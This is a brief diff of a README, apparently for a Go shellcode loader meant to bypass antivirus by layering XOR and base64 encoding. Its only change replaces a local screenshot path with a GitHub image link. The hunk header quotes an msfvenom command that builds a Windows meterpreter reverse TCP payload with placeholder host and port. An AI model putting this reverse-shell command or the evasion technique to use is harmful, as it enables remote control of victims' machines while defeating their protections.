@@ -10,7 +10,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxx 
 
 通过xor和base64多层加密shellcode实现的go加载器bypassav，
 
-![](C:\Users\shu1l\Desktop\新建文件夹 (2)\QQ截图20211010131838.png)
+![](https://github.com/Shu1L/avbypass/blob/main/20211010131838.png)
 
 ![](C:\Users\shu1l\Desktop\新建文件夹 (2)\QQ截图20211010131902.png)
 
